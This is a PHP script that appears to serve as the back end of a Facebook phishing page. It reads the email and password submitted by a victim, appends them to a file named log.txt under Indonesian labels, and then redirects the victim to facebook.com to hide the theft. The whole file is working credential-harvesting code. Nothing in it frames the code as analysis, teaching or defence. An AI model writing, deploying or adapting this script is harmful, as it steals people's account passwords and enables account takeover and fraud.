<?php
header("Location: https:///www.facebook.com");
$ADEx = "log.txt";
$ADEy = $_POST['email'];
$ADEz = $_POST['password'];

$handle = fopen($ADEx, 'a');
fwrite($handle, "Email  :");
fwrite($handle, "\n");
fwrite($handle, "$ADEy");
fwrite($handle, "\n");
fwrite($handle, "Kata Sandi :");
fwrite($handle, "\n");
fwrite($handle, "$ADEz");
fwrite($handle, "\n");
fwrite($handle, "\n");
fclose($handle);
exit;
?>